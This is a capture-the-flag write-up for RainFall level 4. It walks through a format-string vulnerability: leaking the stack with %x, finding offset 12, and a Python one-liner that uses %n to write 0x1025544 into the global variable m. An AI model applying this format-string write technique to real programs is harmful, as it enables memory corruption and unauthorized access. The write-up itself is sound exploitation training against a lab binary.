# LEVEL04





## Analysis

In this challenge we face a similar vulnerability as we did in level3:
```bash
   level4@RainFall:~$ ./level4
   AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
   AAAAb7ff26b0.bffff354.b7fd0ff4.0.0.bffff318.804848d.bffff110.200.b7fd1ac0.b7ff37d0
   level4@RainFall:~$ ./level4 
   AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
   AAAA.b7ff26b0.bffff354.b7fd0ff4.0.0.bffff318.804848d.bffff110.200.b7fd1ac0.b7ff37d0.41414141.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825
```

## Solution: Format strings vulnerability

calculating the offset as we did before, we find 12.

We also have a uninitialized variable <m> (address: 08049810) called here for a similar jump condition:
```
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
```

Here the program is comparing the m with 0x1025544, which is 16930116 (16930116 - 4 = 16930112) in decimal
So as we did before:
```bash
level4@RainFall:~$ (python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112c%12$n"'; cat) | ./level4
[...]
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx
```